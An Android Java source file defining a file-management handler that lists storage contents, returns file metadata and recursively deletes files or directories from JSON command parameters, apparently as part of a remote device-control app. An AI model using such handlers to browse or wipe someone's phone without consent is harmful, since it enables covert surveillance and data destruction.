package com.idsiber.eye.handlers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import com.idsiber.eye.CommandResult;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;

/**
 * Handler untuk manajemen file
 */
public class FileManagementHandler {
    private static final String TAG = "FileManagementHandler";
    private Context context;

    public FileManagementHandler(Context context) {
        this.context = context;
    }

    public CommandResult listFiles(JSONObject params) {
        try {
            // Check storage permission
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) 
                != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Storage permission not granted", null);
            }

            String path = params.optString("path", Environment.getExternalStorageDirectory().getAbsolutePath());
            int maxFiles = params.optInt("max_files", 100);
            boolean includeHidden = params.optBoolean("include_hidden", false);

            File directory = new File(path);
            
            if (!directory.exists()) {
                return new CommandResult(false, "Directory does not exist: " + path, null);
            }

            if (!directory.isDirectory()) {
                return new CommandResult(false, "Path is not a directory: " + path, null);
            }

            File[] files = directory.listFiles();
            if (files == null) {
                return new CommandResult(false, "Cannot read directory: " + path, null);
            }

            // Sort files by name
            Arrays.sort(files, (f1, f2) -> f1.getName().compareToIgnoreCase(f2.getName()));

            JSONArray filesArray = new JSONArray();
            int fileCount = 0;
            long totalSize = 0;

            for (File file : files) {
                if (fileCount >= maxFiles) break;
                
                // Skip hidden files if not requested
                if (!includeHidden && file.getName().startsWith(".")) {
                    continue;
                }

                try {
                    JSONObject fileInfo = new JSONObject();
                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("is_directory", file.isDirectory());
                    fileInfo.put("is_file", file.isFile());
                    fileInfo.put("size", file.length());
                    fileInfo.put("size_readable", formatFileSize(file.length()));
                    fileInfo.put("last_modified", file.lastModified());
                    fileInfo.put("last_modified_readable", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        .format(new Date(file.lastModified())));
                    fileInfo.put("can_read", file.canRead());
                    fileInfo.put("can_write", file.canWrite());
                    fileInfo.put("is_hidden", file.isHidden());

                    // Get file extension
                    String fileName = file.getName();
                    int lastDot = fileName.lastIndexOf('.');
                    String extension = lastDot > 0 ? fileName.substring(lastDot + 1).toLowerCase() : "";
                    fileInfo.put("extension", extension);
                    fileInfo.put("mime_type", getMimeType(extension));

                    filesArray.put(fileInfo);
                    totalSize += file.length();
                    fileCount++;
                } catch (Exception e) {
                    Log.w(TAG, "Error processing file: " + file.getName(), e);
                }
            }

            JSONObject result = new JSONObject();
            result.put("files", filesArray);
            result.put("total_files", fileCount);
            result.put("total_size", totalSize);
            result.put("total_size_readable", formatFileSize(totalSize));
            result.put("directory_path", path);
            result.put("parent_directory", directory.getParent());

            return new CommandResult(true, "Found " + fileCount + " files in " + path, result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to list files: " + e.getMessage(), null);
        }
    }

    public CommandResult deleteFile(JSONObject params) {
        try {
            // Check storage permission
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) 
                != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Storage write permission not granted", null);
            }

            String filePath = params.getString("file_path");
            File file = new File(filePath);

            if (!file.exists()) {
                return new CommandResult(false, "File does not exist: " + filePath, null);
            }

            boolean deleted;
            if (file.isDirectory()) {
                deleted = deleteDirectory(file);
            } else {
                deleted = file.delete();
            }

            if (deleted) {
                JSONObject result = new JSONObject();
                result.put("deleted_path", filePath);
                result.put("was_directory", file.isDirectory());
                return new CommandResult(true, "File deleted: " + filePath, result.toString());
            } else {
                return new CommandResult(false, "Failed to delete file: " + filePath, null);
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to delete file: " + e.getMessage(), null);
        }
    }

    public CommandResult getFileInfo(JSONObject params) {
        try {
            String filePath = params.getString("file_path");
            File file = new File(filePath);

            if (!file.exists()) {
                return new CommandResult(false, "File does not exist: " + filePath, null);
            }

            JSONObject fileInfo = new JSONObject();
            fileInfo.put("name", file.getName());
            fileInfo.put("path", file.getAbsolutePath());
            fileInfo.put("parent_directory", file.getParent());
            fileInfo.put("is_directory", file.isDirectory());
            fileInfo.put("is_file", file.isFile());
            fileInfo.put("size", file.length());
            fileInfo.put("size_readable", formatFileSize(file.length()));
            fileInfo.put("last_modified", file.lastModified());
            fileInfo.put("last_modified_readable", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date(file.lastModified())));
            fileInfo.put("can_read", file.canRead());
            fileInfo.put("can_write", file.canWrite());
            fileInfo.put("can_execute", file.canExecute());
            fileInfo.put("is_hidden", file.isHidden());

            // Get file extension and MIME type
            String fileName = file.getName();
            int lastDot = fileName.lastIndexOf('.');
            String extension = lastDot > 0 ? fileName.substring(lastDot + 1).toLowerCase() : "";
            fileInfo.put("extension", extension);
            fileInfo.put("mime_type", getMimeType(extension));

            // If directory, get child count
            if (file.isDirectory()) {
                File[] children = file.listFiles();
                fileInfo.put("child_count", children != null ? children.length : 0);
            }

            return new CommandResult(true, "File info retrieved", fileInfo.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get file info: " + e.getMessage(), null);
        }
    }

    private boolean deleteDirectory(File directory) {
        try {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteDirectory(file);
                    } else {
                        file.delete();
                    }
                }
            }
            return directory.delete();
        } catch (Exception e) {
            Log.e(TAG, "Error deleting directory", e);
            return false;
        }
    }

    private String formatFileSize(long bytes) {
        if (bytes < 1024) {
            return bytes + " B";
        } else if (bytes < 1024 * 1024) {
            return String.format(Locale.getDefault(), "%.1f KB", bytes / 1024.0);
        } else if (bytes < 1024 * 1024 * 1024) {
            return String.format(Locale.getDefault(), "%.1f MB", bytes / (1024.0 * 1024.0));
        } else {
            return String.format(Locale.getDefault(), "%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0));
        }
    }

    private String getMimeType(String extension) {
        switch (extension) {
            case "txt": return "text/plain";
            case "pdf": return "application/pdf";
            case "doc": case "docx": return "application/msword";
            case "xls": case "xlsx": return "application/vnd.ms-excel";
            case "ppt": case "pptx": return "application/vnd.ms-powerpoint";
            case "zip": return "application/zip";
            case "rar": return "application/rar";
            case "jpg": case "jpeg": return "image/jpeg";
            case "png": return "image/png";
            case "gif": return "image/gif";
            case "mp3": return "audio/mpeg";
            case "mp4": return "video/mp4";
            case "avi": return "video/avi";
            case "html": case "htm": return "text/html";
            case "css": return "text/css";
            case "js": return "text/javascript";
            case "json": return "application/json";
            case "xml": return "text/xml";
            default: return "application/octet-stream";
        }
    }
}
